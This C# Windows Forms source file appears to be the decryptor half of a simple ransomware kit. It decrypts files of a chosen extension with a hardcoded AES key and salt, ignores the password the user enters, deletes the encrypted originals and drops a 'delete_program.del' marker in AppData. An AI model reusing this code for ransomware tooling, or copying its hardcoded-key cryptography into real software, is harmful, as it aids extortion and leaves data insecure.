using System;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace DecryptorTool
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            pictureBox1.Image = Properties.Resources.hacker_gif;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
            folderBrowserDialog.Description = "Select a path";
            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = folderBrowserDialog.SelectedPath;
            }
        }
        private void Decoding(string dizin, string sifre, string uzanti)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(dizin);
            FileInfo[] files = directoryInfo.GetFiles("*." + uzanti, SearchOption.AllDirectories);
            foreach (FileInfo fileInfo in files)
            {
                Decrypt(fileInfo.FullName, fileInfo.FullName.Replace(uzanti, string.Empty), new byte[]
                {
                    1,
                    2,
                    3,
                    4,
                    5,
                    6,
                    7,
                    8
                });
            }
        }
        public void Decrypt(string inputFile, string outputFile, byte[] passwordBytes)
        {
            try
            {
                using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\delete_program.del"))
                {
                    sw.WriteLine("del");
                }
                    byte[] salt = new byte[]
                    {
                    1,
                    2,
                    3,
                    4,
                    5,
                    6,
                    7,
                    8
                    };
                FileStream fileStream = new FileStream(inputFile, FileMode.Open);
                RijndaelManaged rijndaelManaged = new RijndaelManaged();
                rijndaelManaged.KeySize = 256;
                rijndaelManaged.BlockSize = 128;
                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                rijndaelManaged.Padding = PaddingMode.Zeros;
                rijndaelManaged.Mode = CipherMode.CBC;
                CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
                FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
                int num;
                while ((num = cryptoStream.ReadByte()) != -1)
                {
                    fileStream2.WriteByte((byte)num);
                }
                fileStream2.Close();
                cryptoStream.Close();
                fileStream.Close();
                File.Delete(inputFile);
                listBox1.Items.Add("Successfully decrypted: " + inputFile);
            }
            catch (Exception ex)
            {
                listBox1.Items.Add("Not decrypted: " + inputFile + ex.Message);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox2.Text = Clipboard.GetText();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            Decoding(textBox1.Text, textBox2.Text, textBox3.Text.Replace(".", string.Empty));
        }
    }
}
